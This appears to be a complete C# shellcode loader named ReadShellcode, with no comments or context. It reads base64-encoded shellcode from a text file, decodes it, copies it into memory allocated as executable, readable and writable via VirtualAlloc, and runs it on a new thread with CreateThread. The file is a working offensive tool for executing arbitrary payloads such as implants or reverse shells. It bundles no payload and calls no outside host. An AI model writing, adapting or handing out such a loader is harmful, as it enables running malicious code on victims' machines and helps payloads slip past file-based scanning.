
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace ReadShellcode
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                String Base64String = File.ReadAllText(@"ShellcodeBase64.txt");
                byte[] shellcode64 = Convert.FromBase64String(Base64String);

                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode64, 0, (IntPtr)(funcAddr), shellcode64.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    }
}
